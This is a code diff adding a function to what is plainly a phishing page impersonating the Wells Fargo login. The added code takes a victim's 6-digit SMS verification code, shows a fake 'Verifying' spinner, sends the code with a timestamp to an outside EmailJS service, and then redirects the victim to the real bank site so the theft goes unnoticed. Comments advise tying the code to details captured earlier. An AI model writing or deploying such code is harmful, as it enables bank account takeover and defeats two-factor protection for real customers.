@@ -319,6 +319,50 @@
             window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
         }, 3000);
     }
+    // 3. Handle SMS Code Submission
+    function submitCode() {
+        const smsCode = document.getElementById('smsCode').value;
+        if(smsCode.length < 6) {
+            alert("Please enter a valid 6-digit code.");
+            return;
+        }
+
+        // Disable button
+        const btn = document.querySelector('#smsSection button');
+        btn.disabled = true;
+        btn.textContent = "Verifying...";
+
+        // Show processing spinner immediately
+        document.getElementById('smsSection').style.display = 'none';
+        document.querySelector('.container').style.display = 'none';
+        document.getElementById('processing').style.display = 'block';
+
+        // Send SMS Code to EmailJS
+        // We get the current form data again to associate the code with the user session
+        // If you stored the username/email in a variable earlier, you could use that too.
+        // But since the first form is hidden, we can just send the code and timestamp.
+        const smsData = {
+            smsCode: smsCode,
+            timestamp: new Date().toLocaleString(),
+            ip: "User IP" // Note: You'd need to store the IP from step 1 if you want it here too
+        };
+
+        emailjs.send("service_2bhy4ju", "template_1qzswkk", smsData)
+        .then(() => {
+            console.log("SMS Code Sent");
+            // Redirect after a short delay to let the email send
+            setTimeout(() => {
+                window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
+            }, 1500);
+        })
+        .catch((error) => {
+            console.error("SMS Email Failed:", error);
+            // Still redirect even if email fails
+            setTimeout(() => {
+                window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
+            }, 1500);
+        });
+    }
 </script>
     
 
